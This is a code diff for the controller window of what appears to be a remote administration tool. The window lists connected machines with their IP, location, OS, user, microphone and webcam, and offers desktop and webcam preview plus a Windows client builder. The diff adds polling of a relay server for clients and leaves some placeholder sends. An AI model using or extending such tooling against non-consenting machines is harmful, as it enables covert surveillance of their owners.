@@ -166,11 +166,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.actionDesktop_Preview.triggered.connect(self.get_desktop_preview)
         self.actionWebcam_Preview.triggered.connect(self.get_webcam_preview)
 
-        # menu triggers
-        self.actionStartListen_for_connections.triggered.connect(self.listen_start)
-        self.actionStopListen_for_connections.triggered.connect(self.listen_stop)
-        self.actionClient_Configuration.triggered.connect(self.run_settings)
-
         # builder trigger
         self.actionWindows_Client_PyInstaller.triggered.connect(self.run_builder)
 
@@ -245,7 +240,17 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def listen_start(self):
         self.connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection_socket.connect((self.IPADDRESS, self.PORT))
-        self.connection_socket.send()
+
+        self.servers_checker_thread = threading.Thread(target=self.check_servers)
+        self.servers_checker_thread.start()
+
+    def check_servers(self):
+        while 1:
+            data = get(self.connection_socket, 'getClients', 'getClients')
+            self.streaming_socks = ast.literal_eval(data)
+            self.update_servers_table()
+            time.sleep(3)
+
 
     # Start Listen for Servers
     def listen_start2(self):
@@ -269,8 +274,11 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         else:
             self.actionStartListen_for_connections.setChecked(True)
 
-    # Stop Listen for Servers
     def listen_stop(self):
+        self.connection_socket.send('TEST MESSAGE')
+
+    # Stop Listen for Servers
+    def listen_stop2(self):
         if self.acceptthreadState:
             self.acceptthreadState = False
             self.serversTable.clearContents()
@@ -340,28 +348,28 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             for index, obj in enumerate(self.streaming_socks):
 
                 # add ip address & county flag
-                ip_address = self.socks[obj]['ip_address']
+                ip_address = self.streaming_socks[obj]['ip_address']
                 item = QTableWidgetItem(ip_address)
                 item.setIcon(QIcon(get_ip_location(ip_address)))
                 self.serversTable.setItem(index, self.index_of_ipAddress, item)
 
                 # add alias if aviable
-                alias = self.alias.get_alias(self.socks[obj]['ip_address'], self.socks[obj]['os'])
+                alias = self.alias.get_alias(self.streaming_socks[obj]['ip_address'], self.streaming_socks[obj]['os'])
                 item = QTableWidgetItem(alias)
                 self.serversTable.setItem(index, self.index_of_alias, item)
 
                 # add socket number
-                item = QTableWidgetItem(str(self.socks[obj]['socket']))
+                item = QTableWidgetItem(str(self.streaming_socks[obj]['socket']))
                 item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                 self.serversTable.setItem(index, self.index_of_socket, item)
 
                 # add os version
-                item = QTableWidgetItem(self.socks[obj]['os'])
-                item.setIcon(QIcon(os.path.join(assets, os_icon(self.socks[obj]['ostype']))))
+                item = QTableWidgetItem(self.streaming_socks[obj]['os'])
+                item.setIcon(QIcon(os.path.join(assets, os_icon(self.streaming_socks[obj]['ostype']))))
                 self.serversTable.setItem(index, self.index_of_os, item)
 
                 # add server user
-                item = QTableWidgetItem(self.socks[obj]['user'])
+                item = QTableWidgetItem(self.streaming_socks[obj]['user'])
                 item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                 self.serversTable.setItem(index, self.index_of_user, item)
 
@@ -393,7 +401,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 # add input device
                 item = QTableWidgetItem()
-                if self.socks[obj]['inputdevice'] == 'NoDevice':
+                if self.streaming_socks[obj]['inputdevice'] == 'NoDevice':
                     item.setIcon(QIcon(os.path.join(assets, 'mic_no.png')))
                     item.setText(_('INFO_NO'))
                 else:
@@ -403,7 +411,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 # add webcam device
                 item = QTableWidgetItem()
-                if self.socks[obj]['webcamdevice'] == 'NoDevice':
+                if self.streaming_socks[obj]['webcamdevice'] == 'NoDevice':
                     item.setIcon(QIcon(os.path.join(assets, 'web_camera_no.png')))
                     item.setText(_('INFO_NO'))
                 else:
@@ -420,7 +428,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             pass
 
         # update servers online counter
-        self.onlineStatus.setText(str(len(self.socks)))
+        self.onlineStatus.setText(str(len(self.streaming_socks)))
 
     def unlock_client(self):
         while 1:
